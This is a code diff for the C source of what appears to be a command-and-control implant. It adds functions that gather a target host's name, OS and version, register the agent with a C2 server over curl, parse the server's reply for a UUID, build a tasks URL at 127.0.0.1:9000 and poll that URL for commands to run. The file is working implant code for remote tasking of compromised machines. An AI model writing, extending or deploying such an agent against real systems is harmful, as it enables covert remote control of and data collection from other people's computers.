@@ -24,6 +24,7 @@
 
 static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp);
 
+// Obtains target host information (host name, OS, version).
 bool get_host_info(struct agent_info *agent)
 {
 	// Get target hostname.
@@ -47,21 +48,19 @@ bool get_host_info(struct agent_info *agent)
 
 	return true;
 }
-
+// Registers self with C2 server, providing target host information. 
 bool reg(struct agent_info *agent, struct strings_array *sa)
 {
-
-	// struct strings_array chunk = {.response = NULL, .size = 0};
 	struct web_comms web = {NULL, 0, NULL};
 
-	// sa->response = malloc(0);
-	// sa->size = 0;
-
+	// Prepares curl for use across the various follow on functions that use
+	// the curl library.
 	if (!curl_prep(&web))
 	{
 		perror("curl_prep failed\n");
 		exit(1);
 	}
+
 
 	add_curl_field(web.form, "hostname", agent->hostname);
 	add_curl_field(web.form, "os type", agent->os_type);
@@ -78,19 +77,19 @@ bool reg(struct agent_info *agent, struct strings_array *sa)
 	// Send data to mem_cb function as opposed to writing to stdout.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
 
-	// Pass chunk to callback function.
+	// Pass sa to callback function.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
 
 	// Perform the request, res will get the return code
 	web.res = curl_easy_perform(web.curl);
 
-	char *ret;
+	// char *ret;
 
-	// Strchr for @, as the c2 server precedes the UUID with the @ character.
-	ret = strchr(sa->response, '@');
+	// // Strchr for @, as the c2 server precedes the UUID with the @ character.
+	// ret = strchr(sa->response, '@');
 
-	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
-	strncpy(agent->uuid, ret + 1, UUIDLEN);
+	// // Move pointer to the right one (ret +1) to copy UUID after the @ char.
+	// strncpy(agent->uuid, ret + 1, UUIDLEN);
 
 	// Check for errors
 	if (web.res != CURLE_OK)
@@ -133,27 +132,46 @@ static size_t mem_cb(void *contents, size_t size, size_t nmemb, void *userp)
 	return realsize;
 }
 
+void create_tasks_url(char *response, struct agent_info *agent)
+{
+	char *ret;
+
+	// Strchr for @, as the c2 server precedes the UUID with the @ character.
+	ret = strchr(response, '@');
+
+	// Move pointer to the right one (ret +1) to copy UUID after the @ char.
+	strncpy(agent->uuid, ret + 1, UUIDLEN);
+
+	// Concat agent UUID to tasks URL.
+	char tasks_url[64] = "127.0.0.1:9000/tasks/";
+	strncat(tasks_url, agent->uuid, strlen(agent->uuid));
+
+	// Copy URL to agent->tasks_url.
+	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
+	printf("Tasks URL is: %s", agent->tasks_url);
+	agent->got_tasks_url = true;
+
+}
+
+
+// Executes GET request to C2 server to check for tasks.
 bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 {
     struct web_comms web = {NULL, 0, NULL};
-
-	// sa->response = malloc(0);
-	// sa->size = 0;
 
     if (!curl_prep(&web))
     {
         perror("curl_prep failed\n");
         return false;
     }
-	puts("made it past curl prep\n");
-	if(!agent->got_tasks_url) {
-		puts("Made it pas if got tasks\n");
-		char tasks_url[64] = "127.0.0.1:9000/tasks/";
-		strncat(tasks_url, agent->uuid, strlen(agent->uuid));
-		strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
-		printf("Tasks URL is: %s", agent->tasks_url);
-		agent->got_tasks_url = true;
-	}
+
+	// if(!agent->got_tasks_url) {
+	// 	char tasks_url[64] = "127.0.0.1:9000/tasks/";
+	// 	strncat(tasks_url, agent->uuid, strlen(agent->uuid));
+	// 	strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
+	// 	printf("Tasks URL is: %s", agent->tasks_url);
+	// 	agent->got_tasks_url = true;
+	// }
 
 	curl_easy_setopt(web.curl, CURLOPT_URL, agent->tasks_url);
 
@@ -366,6 +384,15 @@ void destroy(struct tasks *task)
 	}
 	// Frees memory for entire file names array.
 	free(task->strings);
+}
+
+void memset_task_vals(struct tasks *task)
+{
+
+	memset(task->id, 0, sizeof(task->id));
+	memset(task->type, 0, sizeof(task->type));
+	memset(task->cmd, 0, sizeof(task->cmd));
+	memset(task->args, 0, sizeof(task->args));
 }
 
 //ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
